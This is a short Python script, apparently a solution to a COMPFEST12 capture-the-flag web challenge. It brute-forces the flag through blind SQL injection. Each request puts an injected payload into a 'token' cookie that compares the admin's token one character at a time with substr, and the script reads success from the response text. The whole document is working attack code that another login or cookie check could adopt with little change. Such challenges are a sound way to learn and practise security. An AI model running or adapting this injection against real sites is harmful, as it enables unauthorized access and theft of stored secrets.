import requests

url = "http://128.199.157.172:28337/flag"

flag = "COMPFEST12{"
i = 12

while True:
	for j in "}-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_":
		cookie = {"token": "' OR username = 'admin' AND substr(token,{},1) ='{}' --".format(i,j)}
		response = requests.get(url=url, cookies=cookie)
		if "flag.txt" in response.text:
			break
	i += 1
	flag += j
	print(flag)
	if j == "}":
		break